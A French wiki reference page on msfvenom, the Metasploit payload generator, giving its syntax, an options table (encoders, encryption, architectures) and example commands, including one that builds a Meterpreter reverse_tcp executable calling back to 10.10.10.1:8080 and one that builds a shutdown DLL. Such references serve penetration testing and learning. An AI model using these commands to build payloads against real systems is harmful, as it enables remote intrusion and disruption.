---
title: msfvenom
description: Permet de générer des charges utiles (payloads) de toutes sortes
published: true
date: 2025-05-04T14:54:46.907Z
tags: outil, linux
editor: markdown
dateCreated: 2024-07-15T20:08:55.994Z
---

# Introduction

msfvenom est un outil de la suite Metasploit, cet outil permet de générer des charges utiles (payloads) de toutes sortes.

> La suite Metasploit est disponible au téléchargement ici: https://github.com/rapid7/metasploit-framework
> {.is-info}

# Syntaxe

`msfvenom -p [type de payload] [variable=valeur] -f [format] -o [fichier de sortie] [options]`

# Options

| Option                            | Description                                                                                                         |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| `-l [type]`                       | Liste tous les modules disponibles pour le type indiqué (paylods,encoders,nops,platforms,archs,encrypt,formats,all) |
| `-p [type de paylaod]`            | Spécifie le payload à utiliser                                                                                      |
| `--list-options`                  | Affiche les options disponibles avec le payload sélectionné                                                         |
| `-f [format]`                     | Spécifie le format à utiliser                                                                                       |
| `-e [encodeur]`                   | Spécifie l'encodeur à utiliser                                                                                      |
| `--service-name [nom]`            | Spécifie le nom du service lorsqu'un binaire de service est généré                                                  |
| `--smallest [nom]`                | Génere le payload le plus petit possible avec tous les encodeurs disponibles                                        |
| `--encrypt [type de chiffrement]` | Spécifie le type de chiffrement utilisé                                                                             |
| `--encrypt-key [clé]`             | Clé à utiliser avec le chiffrement                                                                                  |
| `-a [architecture]`               | Spécifie l'architecture souhaitée pour la génération du payload et l'encodage                                       |
| `-o [sortie]`                     | Sauvegarde le payload vers un fichier                                                                               |

# Exemples

Liste les payloads disponibles

`msfvenom -l payloads`

Utilise le payload windows/x64/exec avec comme argument cmd='shutdown /s', génere un fichier dll et l'exporte vers shutdown.dll

`msfvenom -p windows/x64/exec cmd='shutdown /s' -f dll -o shutdown.dll`

Utilise le payload windows/meterpreter/reverse_tcp avec comme argument LHOST=10.10.10.1 et LPORT=8080, génere un fichier exe et l'exporte vers reverse.exe

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=8080 -f exe -o reverse.exe`
